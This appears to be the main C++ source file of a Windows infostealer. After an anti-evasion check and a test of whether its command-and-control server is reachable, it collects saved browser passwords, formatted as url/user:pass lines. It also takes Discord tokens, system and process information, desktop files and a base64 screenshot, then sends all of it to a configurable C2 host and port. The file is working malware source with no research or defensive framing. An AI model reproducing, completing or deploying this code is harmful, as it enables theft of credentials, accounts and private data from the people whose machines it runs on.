
#ifndef BENCH
#define BENCH 0
#endif

#if defined(__has_include)
#  if __has_include("c2_config.h")
#    include "c2_config.h"
#  endif
#endif

#ifndef MOD_BROWSERS
#define MOD_BROWSERS   1
#endif
#ifndef MOD_DISCORD
#define MOD_DISCORD    1
#endif
#ifndef MOD_SYSINFO
#define MOD_SYSINFO    1
#endif
#ifndef MOD_PROCS
#define MOD_PROCS      1
#endif
#ifndef MOD_DESKTOP
#define MOD_DESKTOP    1
#endif
#ifndef MOD_SCREENSHOT
#define MOD_SCREENSHOT 1
#endif

#ifndef C2_HOST
#define C2_HOST  L"127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT  4444
#endif
#ifndef C2_PATH
#define C2_PATH  L"/collect"
#endif

#include "antievasion.hpp"
#include "crypt.hpp"
#include "exfil.hpp"
#include "sysinfo.hpp"
#include <nlohmann/json.hpp>
#include <string>
#include <sstream>
#include <set>
#include <vector>
using json = nlohmann::json;

#if MOD_BROWSERS
#include "browsers.hpp"
#endif
#if MOD_DISCORD
#include "discord.hpp"
#endif

static std::string ScreenshotB64() {
#if MOD_SCREENSHOT
    int W = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int H = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int X = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int Y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    HDC hScrDC  = GetDC(nullptr);
    HDC hMemDC  = CreateCompatibleDC(hScrDC);
    HBITMAP hBmp = CreateCompatibleBitmap(hScrDC, W, H);
    SelectObject(hMemDC, hBmp);
    BitBlt(hMemDC, 0, 0, W, H, hScrDC, X, Y, SRCCOPY);

    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR tok;
    Gdiplus::GdiplusStartup(&tok, &gsi, nullptr);
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hBmp, nullptr);

    IStream* stream = nullptr;
    CreateStreamOnHGlobal(nullptr, TRUE, &stream);

    UINT n = 0, sz = 0;
    Gdiplus::GetImageEncodersSize(&n, &sz);
    std::vector<uint8_t> buf(sz);
    auto* enc = (Gdiplus::ImageCodecInfo*)buf.data();
    Gdiplus::GetImageEncoders(n, sz, enc);
    CLSID pngId{};
    for (UINT i = 0; i < n; i++)
        if (std::wstring(enc[i].MimeType) == L"image/png") { pngId = enc[i].Clsid; break; }

    bmp->Save(stream, &pngId, nullptr);
    delete bmp;
    Gdiplus::GdiplusShutdown(tok);

    HGLOBAL hg = nullptr;
    GetHGlobalFromStream(stream, &hg);
    SIZE_T dataSize = GlobalSize(hg);
    void* ptr = GlobalLock(hg);
    std::string raw((char*)ptr, dataSize);
    GlobalUnlock(hg);
    stream->Release();
    DeleteObject(hBmp); DeleteDC(hMemDC); ReleaseDC(nullptr, hScrDC);

    static const char* T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out; out.reserve(((raw.size()+2)/3)*4);
    for (size_t i = 0; i < raw.size(); i += 3) {
        uint32_t v = ((uint8_t)raw[i]<<16)
                   | ((i+1<raw.size()?(uint8_t)raw[i+1]:0)<<8)
                   | (i+2<raw.size()?(uint8_t)raw[i+2]:0);
        out += T[(v>>18)&63]; out += T[(v>>12)&63];
        out += (i+1<raw.size()) ? T[(v>>6)&63] : '=';
        out += (i+2<raw.size()) ? T[v&63]      : '=';
    }
    return out;
#else
    return {};
#endif
}

static std::string BuildULP(const json& browsers) {
    std::set<std::string> seen;
    std::string out;
    for (auto& br : browsers) {
        for (auto& entry : br.value("logins", json::array())) {
            std::string url  = entry.value("url", "");
            std::string user = entry.value("user", "");
            std::string pass = entry.value("pass", "");
            if (url.empty() || pass.empty()) continue;
            while (!url.empty() && url.back() == '/') url.pop_back();
            std::string line = url + "/" + user + ":" + pass;
            if (seen.insert(line).second) out += line + "\n";
        }
    }
    return out;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    if (!EvasionGate()) return 0;

    if (!CollectorUp(C2_HOST, (INTERNET_PORT)C2_PORT)) return 0;

    json payload;
    payload["ulp"] = "";

#if MOD_BROWSERS
    auto browsers = GrabAllBrowsers();
    payload["browsers"] = browsers;
    payload["ulp"]      = BuildULP(browsers);
#endif

#if MOD_DISCORD
    payload["discord"] = GrabDiscordTokens();
#endif

#if MOD_SYSINFO
    payload["sysinfo"] = GrabSysInfo();
#endif

#if MOD_PROCS
    payload["processes"] = GrabProcesses();
#endif

#if MOD_DESKTOP
    payload["desktop_files"] = GrabDesktopFiles();
#endif

    payload["screenshot"] = ScreenshotB64();

    std::string js = payload.dump(-1, ' ', false, json::error_handler_t::replace);
    ExfilData(js, C2_HOST, C2_PORT, C2_PATH);
    return 0;
}
